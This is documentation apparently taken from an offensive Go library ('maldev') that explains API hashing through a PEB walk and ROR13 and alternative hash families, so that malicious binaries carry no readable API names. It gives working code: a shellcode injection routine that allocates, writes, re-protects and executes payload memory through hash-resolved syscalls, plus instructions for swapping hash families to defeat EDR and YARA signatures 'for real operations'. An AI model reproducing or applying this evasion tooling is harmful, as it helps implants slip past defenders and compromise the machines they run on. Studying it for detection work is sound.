---
last_reviewed: 2026-05-04
reflects_commit: 1f9e413
---

# API Hashing (PEB Walk + ROR13)

[<- Back to Syscalls Overview](README.md)

**MITRE ATT&CK:** [T1106 - Native API](https://attack.mitre.org/techniques/T1106/)
**D3FEND:** [D3-FCR - Function Call Restriction](https://d3fend.mitre.org/technique/d3f:FunctionCallRestriction/)

---

## What api-hashing is NOT

> [!IMPORTANT]
> `api-hashing` is **only** the symbol-resolution axis (concern #3
> in [README.md](README.md)). It answers "how do I find the right
> export without a plaintext string?".
>
> It does **not** decide:
>
> - **how the syscall fires** — that's the calling method
>   (`MethodWinAPI` / `MethodNativeAPI` / `MethodDirect` /
>   `MethodIndirect` / `MethodIndirectAsm`). See
>   [direct-indirect.md](direct-indirect.md).
> - **where the SSN comes from** — that's the SSN resolver
>   (`HellsGate` / `HalosGate` / `TartarusGate` / `Chain`). See
>   [ssn-resolvers.md](ssn-resolvers.md). `HashGate` is the
>   resolver that *uses* api-hashing to find the Nt* prologue.
>
> Tuning hashing alone does not give you a stealthier syscall —
> a hash-resolved `MethodWinAPI` call still goes through every
> kernel32/ntdll hook in the process. Pair api-hashing with the
> calling method and SSN resolver you want.

## Primer

When your program calls `VirtualAlloc`, the string `"VirtualAlloc"` appears in the binary. Any analyst running `strings` on your executable can see exactly which dangerous APIs you use.

**Instead of calling someone by name (which gets overheard), you use a coded number.** API hashing converts function names like `"NtAllocateVirtualMemory"` into numeric hashes like `0xD33BCABD`. Your binary only contains these numbers -- no readable strings. At runtime, the code walks the Process Environment Block (PEB) to find loaded DLLs and their exports, hashing each export name until it finds a match.

---

## How It Works

```mermaid
flowchart TD
    subgraph "Build Time"
        FN["Function name:\nNtAllocateVirtualMemory"] -->|ROR13| HASH["Hash constant:\n0xD33BCABD"]
        MN["Module name:\nKERNEL32.DLL"] -->|"ROR13 (wide + null)"| MHASH["Hash constant:\n0x50BB715E"]
    end

    subgraph "Runtime Resolution"
        TEB["Thread Environment Block\n(GS:0x30)"] -->|"+0x60"| PEB["Process Environment Block"]
        PEB -->|"+0x18"| LDR["PEB_LDR_DATA"]
        LDR -->|"+0x10"| LIST["InLoadOrderModuleList"]

        LIST --> WALK["Walk linked list"]
        WALK --> MOD1["ntdll.dll\nBase: 0x7FFE..."]
        WALK --> MOD2["KERNEL32.DLL\nBase: 0x7FFD..."]
        WALK --> MOD3["...other DLLs"]

        MOD2 -->|"Hash BaseDllName\ncompare with 0x50BB715E"| MATCH["Module found!"]
        MATCH -->|"Parse PE headers"| EXPORTS["Export Directory"]
        EXPORTS -->|"Walk AddressOfNames"| EWALK["Hash each export name"]
        EWALK -->|"Compare with 0xD33BCABD"| FOUND["Function address found!"]
    end

    HASH -.->|"embedded in binary"| EWALK
    MHASH -.->|"embedded in binary"| MOD2

    style HASH fill:#a94,color:#fff
    style MHASH fill:#a94,color:#fff
    style FOUND fill:#4a9,color:#fff
```

### PEB Walk Details

The PEB (Process Environment Block) contains a list of all loaded DLLs. On x64 Windows:

1. **TEB** (Thread Environment Block) is at `GS:0x30`
2. **PEB** is at `TEB+0x60`
3. **PEB_LDR_DATA** is at `PEB+0x18`
4. **InLoadOrderModuleList** starts at `LDR+0x10`

Each entry in the list is an `LDR_DATA_TABLE_ENTRY` containing:
- `+0x30`: DllBase (the module's base address)
- `+0x58`: BaseDllName as UNICODE_STRING (Length, MaxLength, Buffer)

### ROR13 Hashing

ROR13 (Rotate Right by 13 bits) is the de facto standard for shellcode API hashing:

```text
For each character c in the name:
    hash = (hash >> 13) | (hash << 19)   // rotate right 13 bits
    hash = hash + c                       // add character value
```

Two variants exist in maldev:
- **ROR13** (`hash.ROR13`): ASCII, no null terminator -- used for export names
- **ROR13Module** (`hash.ROR13Module`): UTF-16LE wide chars + null terminator -- used for PEB module names

### Beyond ROR13 — defeating signature engines

Many EDR signature engines key on the canonical ROR13 constants
(`0x6A4ABC5B` for `kernel32`, `0x4FC8BB5A` for `LoadLibraryA`, …).
If the engine sees those uint32s in a binary's `.rdata`, it
flags the file regardless of the runtime behaviour.

Pivoting to a different hash family makes the implant's
constants statically distinct. The `hash` package ships:

| Function | Output | Notes |
|---|---|---|
| [`hash.ROR13(name)`](https://pkg.go.dev/github.com/oioio-space/maldev/hash#ROR13) | `uint32` | Canonical shellcode hash; widest signature exposure. |
| [`hash.JenkinsOAAT(name)`](https://pkg.go.dev/github.com/oioio-space/maldev/hash#JenkinsOAAT) | `uint32` | Bob Jenkins one-at-a-time + avalanche tail; cheap, no division, slightly better avalanche than ROR13. |
| [`hash.FNV1a32(name)`](https://pkg.go.dev/github.com/oioio-space/maldev/hash#FNV1a32) | `uint32` | FNV-1a 32-bit; matches `hash/fnv` byte-for-byte. |
| [`hash.FNV1a64(name)`](https://pkg.go.dev/github.com/oioio-space/maldev/hash#FNV1a64) | `uint64` | FNV-1a 64-bit. |
| [`hash.DJB2(name)`](https://pkg.go.dev/github.com/oioio-space/maldev/hash#DJB2) | `uint32` | Bernstein `hash * 33 + c`; classic, weaker on short inputs. |
| [`hash.CRC32(name)`](https://pkg.go.dev/github.com/oioio-space/maldev/hash#CRC32) | `uint32` | IEEE polynomial; backed by `hash/crc32` table. |

Compose with [`win/syscall`](direct-indirect.md):

```go
caller := wsyscall.New(
    wsyscall.MethodIndirectAsm,
    wsyscall.NewHashGateWith(hash.JenkinsOAAT),
).WithHashFunc(hash.JenkinsOAAT)
```

Both ends MUST agree: `NewHashGateWith(fn)` for the resolver,
`WithHashFunc(fn)` for any `CallByHash` call. Pre-compute the
hash constants once at build time (or via a `go generate` step)
to keep the binary string-free.

#### `cmd/hashgen` — generate the constants

Use the in-tree CLI to emit `const Hash<Algo><Symbol> = 0x…`
declarations for any of the 7 supported algorithms (`ror13`,
`ror13module`, `fnv1a32`, `fnv1a64`, `jenkins`, `djb2`, `crc32`):

```bash
go run ./cmd/hashgen -algo jenkins -package winhashes \
    LoadLibraryA GetProcAddress NtAllocateVirtualMemory > winhashes/winhashes_gen.go
```

Or, for `go generate`-style integration, drop a stanza like the
following into a stub file and check the generated output into git:

```go
//go:generate go run ../../cmd/hashgen -algo jenkins -package winhashes -o winhashes_gen.go LoadLibraryA GetProcAddress
```

This keeps the runtime cost zero (no hashing on each process
start) and the binary string-free.

### PE Export Resolution

Once the module base is found, the code parses the PE export directory:

1. Read `e_lfanew` at offset `0x3C` to find the PE header
2. Navigate to `DataDirectory[0]` (export directory) at PE header `+24+112`
3. Walk `AddressOfNames`, hash each name, compare with target hash
4. On match, read the ordinal from `AddressOfNameOrdinals` and the RVA from `AddressOfFunctions`

---

## Usage

### ResolveByHash: Find a Function Address

```go
import "github.com/oioio-space/maldev/win/api"

// Resolve LoadLibraryA in KERNEL32.DLL -- no strings in binary
addr, err := api.ResolveByHash(api.HashKernel32, api.HashLoadLibraryA)
if err != nil {
    log.Fatal(err)
}
// addr is now the function pointer for LoadLibraryA
```

### CallByHash: Execute a Syscall by Hash

```go
import (
    "github.com/oioio-space/maldev/win/api"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewHashGate())
defer caller.Close()

// NtAllocateVirtualMemory via hash -- zero plaintext function names
ret, err := caller.CallByHash(api.HashNtAllocateVirtualMemory,
    uintptr(0xFFFFFFFFFFFFFFFF),
    uintptr(unsafe.Pointer(&baseAddr)),
    0,
    uintptr(unsafe.Pointer(&regionSize)),
    windows.MEM_COMMIT|windows.MEM_RESERVE,
    windows.PAGE_READWRITE,
)
```

### HashGateResolver: SSN Resolution by Hash

```go
import wsyscall "github.com/oioio-space/maldev/win/syscall"

// HashGate resolves SSNs via PEB walk -- no LazyProc.Find() calls
resolver := wsyscall.NewHashGate()
ssn, err := resolver.Resolve("NtCreateThreadEx")
// ssn is the syscall service number (e.g., 0xC1)
```

### Pre-Computed Hash Constants

```go
// Module hashes (ROR13Module of BaseDllName in PEB)
api.HashKernel32  // 0x50BB715E  "KERNEL32.DLL"
api.HashNtdll     // 0x411677B7  "ntdll.dll"
api.HashAdvapi32  // 0x9CB9105F  "ADVAPI32.dll"
api.HashUser32    // 0x51319D6F  "USER32.dll"
api.HashShell32   // 0x18D72CAC  "SHELL32.dll"

// Function hashes (ROR13 of ASCII export name)
api.HashLoadLibraryA            // 0xEC0E4E8E
api.HashGetProcAddress          // 0x7C0DFCAA
api.HashVirtualAlloc            // 0x91AFCA54
api.HashNtAllocateVirtualMemory // 0xD33BCABD
api.HashNtProtectVirtualMemory  // 0x8C394D89
api.HashNtCreateThreadEx        // 0x4D1DEB74
api.HashNtWriteVirtualMemory    // 0xC5108CC2
```

---

## Combined Example: defeat ROR13 fingerprinting

A ROR13-only signature engine sees the canonical
`api.HashLoadLibraryA = 0xEC0E4E8E` constant in the binary's
`.rdata` and flags the file. Switching the entire stack to
JenkinsOAAT changes that constant to a fresh value the engine
never trained on:

```go
package main

import (
    "fmt"

    "github.com/oioio-space/maldev/hash"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

func main() {
    // Both ends MUST agree on the hash family.
    caller := wsyscall.New(
        wsyscall.MethodIndirectAsm,
        wsyscall.NewHashGateWith(hash.JenkinsOAAT),
    ).WithHashFunc(hash.JenkinsOAAT)
    defer caller.Close()

    // Pre-compute the funcHash at build time. JenkinsOAAT yields a
    // different uint32 than ROR13 for the same name, so existing
    // signature databases targeting the ROR13 constant don't match.
    ntClose := hash.JenkinsOAAT("NtClose") // = 0x???????? (your build's value)

    if _, err := caller.CallByHash(ntClose, 0); err != nil {
        fmt.Println("syscall:", err)
    }
}
```

`hash.FNV1a32`, `hash.DJB2`, `hash.CRC32`, and `hash.FNV1a64`
swap in identically — pick the family least represented in the
target signature corpus.

## Combined Example: String-Free Injection

```go
package main

import (
    "unsafe"

    "golang.org/x/sys/windows"

    "github.com/oioio-space/maldev/crypto"
    "github.com/oioio-space/maldev/win/api"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

func main() {
    // All function resolution via hashes -- no "NtAllocateVirtualMemory" string in binary
    caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewHashGate())
    defer caller.Close()

    // Decrypt shellcode (key would be derived at runtime in production)
    key, _ := crypto.NewAESKey()
    shellcode := []byte{/* ... */}
    encrypted, _ := crypto.EncryptAESGCM(key, shellcode)
    decrypted, _ := crypto.DecryptAESGCM(key, encrypted)

    // Allocate memory via hash
    var baseAddr uintptr
    regionSize := uintptr(len(decrypted))
    caller.CallByHash(api.HashNtAllocateVirtualMemory,
        uintptr(0xFFFFFFFFFFFFFFFF),
        uintptr(unsafe.Pointer(&baseAddr)),
        0,
        uintptr(unsafe.Pointer(&regionSize)),
        windows.MEM_COMMIT|windows.MEM_RESERVE,
        windows.PAGE_READWRITE,
    )

    // Write shellcode via hash
    var bytesWritten uintptr
    caller.CallByHash(api.HashNtWriteVirtualMemory,
        uintptr(0xFFFFFFFFFFFFFFFF),
        baseAddr,
        uintptr(unsafe.Pointer(&decrypted[0])),
        uintptr(len(decrypted)),
        uintptr(unsafe.Pointer(&bytesWritten)),
    )

    // Change protection via hash
    var oldProtect uintptr
    caller.CallByHash(api.HashNtProtectVirtualMemory,
        uintptr(0xFFFFFFFFFFFFFFFF),
        uintptr(unsafe.Pointer(&baseAddr)),
        uintptr(unsafe.Pointer(&regionSize)),
        windows.PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtect)),
    )

    // Execute via hash
    var threadHandle uintptr
    caller.CallByHash(api.HashNtCreateThreadEx,
        uintptr(unsafe.Pointer(&threadHandle)),
        0x1FFFFF, 0, uintptr(0xFFFFFFFFFFFFFFFF),
        baseAddr, 0, 0, 0, 0, 0, 0,
    )

    windows.WaitForSingleObject(windows.Handle(threadHandle), windows.INFINITE)
}
```

---

## Advantages & Limitations

### Advantages

- **No plaintext strings**: `strings` and YARA rules targeting API names find nothing
- **No IAT entries**: Functions resolved at runtime are invisible in the Import Address Table
- **Composable**: HashGate works as an SSNResolver in the Chain pipeline
- **Lazy init**: ntdll base address resolved once via `sync.Once`, cached for all subsequent calls

### Limitations

- **ROR13 collisions**: Theoretically possible (32-bit hash space), though none exist for common NT function names
- **PEB walk detectable**: ETW providers and some EDRs monitor PEB traversal patterns
- **Hash constants are signatures**: Known ROR13 values (e.g., `0xD33BCABD` for NtAllocateVirtualMemory) become YARA targets themselves — switch families (`hash.JenkinsOAAT` / `hash.FNV1a32` / `hash.DJB2` / `hash.CRC32`) to render those signatures useless against your binary. `NewHashGateWith(fn)` and `Caller.WithHashFunc(fn)` recompute the `ntdll.dll` module-name hash via `fn` at construction time, so the ROR13Module fingerprint constant `0x411677B7` no longer appears in binaries built with a non-ROR13 family — the swap is end-to-end, not function-only
- **No pre-computed Hash\* constants for non-ROR13 families**: `win/api.HashKernel32` / `HashLoadLibraryA` / etc. are ROR13-only. When pairing `wsyscall.NewHashGateWith(hash.JenkinsOAAT)` with `Caller.CallByHash`, callers compute the funcHash at build time themselves. A `cmd/hashgen` `go generate` step that emits per-family constant tables is queued under backlog row P2.24.
- **Requires loaded modules**: Can only resolve functions from DLLs already in the PEB -- cannot load new DLLs by hash alone

---

## API Reference

Three packages collaborate on the hashing path: `win/api` owns the
PEB-walk + PE-export-table resolver, `win/syscall` owns the Caller
seam that consumes resolved hashes, and `hash` owns the hash
families themselves. Per-export fielded coverage lives with the
canonical owner — entries from `win/syscall` and `hash` are
cross-referenced rather than duplicated.

### Package `win/api` — PEB-walk resolver

#### `ResolveByHash(moduleHash, funcHash uint32) (uintptr, error)`

- godoc: locate a function by module-name hash + export-name hash. No plaintext strings.
- Description: convenience composition — `ModuleByHash(moduleHash)` then `ExportByHash(base, funcHash)`. Use this when both hashes are known at build time (precomputed via `cmd/hashgen` or the `Hash*` constants below).
- Parameters: `moduleHash` — `ROR13Module` of the BaseDllName (case-sensitive, with trailing null); `funcHash` — `ROR13` of the ASCII export name (no null).
- Returns: absolute virtual address of the export; wrapped error from either lookup step.
- Side effects: in-process PEB + PE-export read; no syscalls, no allocations.
- OPSEC: completely silent — no LoadLibrary, no GetProcAddress, no string artifacts in the binary.
- Required privileges: none.
- Platform: Windows + amd64. The PEB and LDR_DATA_TABLE_ENTRY offsets are x64-specific.

#### `ModuleByHash(hash uint32) (uintptr, error)`

- godoc: walk the PEB's `InLoadOrderModuleList` and return the first module whose `BaseDllName` hashes to `hash`.
- Description: `TEB[+0x60] → PEB → PEB[+0x18] → PEB_LDR_DATA → +0x10 → InLoadOrderModuleList`, then iterates the linked list checking each `LDR_DATA_TABLE_ENTRY`'s `BaseDllName` UNICODE_STRING. Hashes the UTF-16LE buffer with the package-internal `ror13Wide` (low-byte ASCII fast path, full uint16 fall-through for non-ASCII chars), with a null terminator appended — matches `hash.ROR13Module` for ASCII-compatible module names.
- Parameters: `hash` precomputed `ROR13Module` of the module name.
- Returns: module base address; `"module hash 0x%08X not found in PEB"` if no match.
- Side effects: read-only PEB / LDR walk. Allocates nothing.
- OPSEC: silent. The PEB walk is undetectable from a userland EDR — only kernel-side walkers can observe it.
- Required privileges: none.
- Platform: Windows + amd64.

#### `ExportByHash(moduleBase uintptr, funcHash uint32) (uintptr, error)`

- godoc: walk a loaded PE module's export directory and return the first export whose name hashes to `funcHash`.
- Description: validates the `MZ` signature at `moduleBase`, follows `e_lfanew` to the PE header, reads the optional-header DataDirectory[0] (export directory) at offset `peHeader + 24 + 112` (x64 layout). Iterates `NumberOfNames` entries, hashes each ASCII export name with the package-internal `ror13Ascii` (no null terminator — matches `hash.ROR13`), and on match resolves through `AddressOfNameOrdinals[i]` → `AddressOfFunctions[ordinal]` → returns `moduleBase + funcRVA`.
- Parameters: `moduleBase` resolved via `ModuleByHash` (or `windows.GetModuleHandle` for already-loaded modules); `funcHash` precomputed `ROR13` of the export name.
- Returns: function address; `"invalid MZ header"`, `"no export directory"`, or `"export hash 0x%08X not found"` on miss.
- Side effects: read-only PE-header walk. Allocates nothing.
- OPSEC: silent.
- Required privileges: none. Module must be loaded in the current process.
- Platform: Windows + amd64. The DataDirectory offset (+112) is the PE32+ (x64) layout — PE32 (x86) would use +96.

#### `Hash*` precomputed constants

```go
// Modules (ROR13Module of BaseDllName as stored in PEB)
HashKernel32 uint32 = 0x50BB715E // "KERNEL32.DLL"
HashNtdll    uint32 = 0x411677B7 // "ntdll.dll"
HashAdvapi32 uint32 = 0x9CB9105F // "ADVAPI32.dll"
HashUser32   uint32 = 0x51319D6F // "USER32.dll"
HashShell32  uint32 = 0x18D72CAC // "SHELL32.dll"

// Functions (ROR13 of ASCII export name)
HashLoadLibraryA            uint32 = 0xEC0E4E8E
HashGetProcAddress          uint32 = 0x7C0DFCAA
HashVirtualAlloc            uint32 = 0x91AFCA54
HashVirtualProtect          uint32 = 0x7946C61B
HashCreateThread            uint32 = 0xCA2BD06B
HashNtAllocateVirtualMemory uint32 = 0xD33BCABD
HashNtProtectVirtualMemory  uint32 = 0x8C394D89
HashNtCreateThreadEx        uint32 = 0x4D1DEB74
HashNtWriteVirtualMemory    uint32 = 0xC5108CC2
```

- Description: build-time-baked ROR13 hashes for the Win32 / Nt names commonly resolved at runtime. Module-name casing matches the PEB's `BaseDllName` exactly — `KERNEL32.DLL` is uppercase but `ntdll.dll` is lowercase, mirroring the loader's actual storage.
- OPSEC caveat: these are the canonical ROR13 constants of well-known names. Public YARA / capa rule sets fingerprint them. For OPSEC-sensitive implants, generate per-build constants with a fresh `HashFunc` family from the [`hash`](#package-hash--hash-families-cross-reference) package and pass them through `Caller.WithHashFunc` / `NewHashGateWith` so the binary carries no canonical fingerprint.

### Package `win/syscall` — Caller integration (cross-reference)

The string-free syscall path consumes the resolved hashes via the
Caller seam:

#### `(*Caller).CallByHash(funcHash uint32, args ...uintptr) (uintptr, error)` ⇒ [direct-indirect.md § CallByHash](direct-indirect.md#callercallbyhashfunchash-uint32-args-uintptr-uintptr-error)

- Stub note: full fielded coverage in `direct-indirect.md`. The relevant OPSEC bullet: pair with `Caller.WithHashFunc(myFn)` so the same `funcHash` is computed by both ends; pre-compute the constant via `cmd/hashgen` at build time so no hashing happens at runtime.

#### `NewHashGate() *HashGateResolver` and `NewHashGateWith(fn HashFunc) *HashGateResolver` ⇒ [ssn-resolvers.md § HashGate](ssn-resolvers.md#hashgate-string-free-resolver)

- Stub note: full fielded coverage in `ssn-resolvers.md`. HashGate is the SSN-extraction strategy that uses the same PEB+export hash chain as `ResolveByHash` but reads the SSN out of the export's prologue instead of returning the address.

### Package `hash` — hash families (cross-reference)

The `hash` package owns every hash function used by the API-hashing
path. Pass any of these as `HashFunc` into `Caller.WithHashFunc` and
`NewHashGateWith` to swap families. **Both ends of the lookup must
agree on the family**; a single per-implant family applied
consistently removes the canonical fingerprint.

- `ROR13(name string) uint32` ⇒ [hash/cryptographic-hashes.md § ROR13](../hash/cryptographic-hashes.md#ror13name-string-uint32) — package default; null-terminator-free; canonical shellcode hash.
- `ROR13Module(name string) uint32` ⇒ [hash/cryptographic-hashes.md § ROR13Module](../hash/cryptographic-hashes.md#ror13modulename-string-uint32) — wraps `ROR13(name + "\x00")` for module-name hashing.
- `FNV1a32(name string) uint32` — alternative 32-bit family (FNV-1a). Used by [`cmd/hashgen --family fnv1a32`](../../../cmd/hashgen/) for fresh constants.
- `FNV1a64(name string) uint64` — 64-bit FNV-1a. Note the wider return type; not directly compatible with `HashFunc` (uint32) — kept for callers building their own lookup tables.
- `JenkinsOAAT(name string) uint32` — Bob Jenkins' one-at-a-time hash. Different bit-mixing constants from FNV/ROR13 — useful as a third decorrelated family.
- `DJB2(name string) uint32` — Daniel J. Bernstein's `((h<<5) + h) + c` accumulator. Classic, well-distributed, distinct enough from ROR13 to defeat naive signature engines.
- `CRC32(name string) uint32` — `crypto/hash/crc32` over the ASCII bytes; standard library implementation. Not cryptographic but ubiquitous in benign code (table lookups, file integrity), which is itself a form of cover.

OPSEC summary: stick with `ROR13` only when binary-size and
cross-tool compatibility outweigh signature concerns. For real
operations, generate constants with a per-implant family and pin
both ends with `WithHashFunc` + `NewHashGateWith`.

## See also

- [Syscalls area README](README.md)
- [`syscalls/ssn-resolvers.md`](ssn-resolvers.md) — the resolver chain that uses these hashes
- [`syscalls/direct-indirect.md`](direct-indirect.md) — the calling-method side of the same Caller seam
